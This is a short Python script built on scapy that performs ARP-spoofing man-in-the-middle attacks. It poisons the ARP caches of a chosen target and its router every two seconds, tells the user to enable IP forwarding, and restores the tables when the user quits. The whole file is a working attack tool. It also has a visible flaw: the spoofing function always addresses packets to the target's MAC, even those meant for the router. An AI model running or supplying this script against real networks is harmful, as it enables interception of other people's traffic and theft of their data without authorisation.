#  Copyright (c) 2019. - ciphyr
#  Email: ciphyr[at]protonmail.com
#
#  Licensed under the Apache License, Version 2.0 (the "License");
#  You may not use this file except in compliance with the License.
#  You may obtain a copy of the License at
#
#  http://www.apache.org/licenses/LICENSE-2.0
#
#  Unless required by applicable law or agreed to in writing, software
#  distributed under the License is distributed on an "AS IS" BASIS,
#  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
#  See the License for the specific language governing permissions and
#  limitations under the License.

import scapy.all as scapy
import time
import sys
import argparse


# Note: Ensure that Port Forwarding is ON! echo 1 > /proc/sys/net/ipv4/ip_forward

def get_cmd_args():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", dest="target", help="Target IP address")
    parser.add_argument("-r", "--router", dest="router", help="Router IP address")
    args = parser.parse_args()

    if not args.target:
        parser.error("Please specify a target IP, --help for usage info")
    if not args.router:
        parser.error("Please specify a router IP, --help for usage info")

    return args


def arp_spoof(target_ip, spoofed_ip):
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoofed_ip)
    scapy.send(packet, verbose=False)


def get_mac(targetIP):
    arp_request = scapy.ARP(pdst=targetIP)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_broadcast_request = broadcast / arp_request

    responses_list = scapy.srp(arp_broadcast_request, timeout=1, verbose=False)[0]
    return responses_list[0][1].hwsrc


def undo_spoof(target_ip, router_ip):
    packetOne = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=router_ip, hwsrc=router_mac)
    packetTwo = scapy.ARP(op=2, pdst=router_ip, hwdst=router_mac, psrc=target_ip, hwsrc=target_mac)
    scapy.send(packetOne, count=4, verbose=False)
    scapy.send(packetTwo, count=4, verbose=False)


args = get_cmd_args()

target_ip = args.target
router_ip = args.router

target_mac = get_mac(target_ip)
router_mac = get_mac(router_ip)

packets_sent = 0
print("Spoofing @ 2s intervals. Use CTRL-C to quit")

try:
    while True:
        arp_spoof(target_ip, router_ip)
        arp_spoof(router_ip, target_ip)
        packets_sent += 2
        print("\r[+] Packets Sent: " + str(packets_sent)),
        sys.stdout.flush()
        #change for Python3
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[-] Restoring target ARP tables...")
    undo_spoof(target_ip, router_ip)
    print("[=] Complete. Program quitting...")
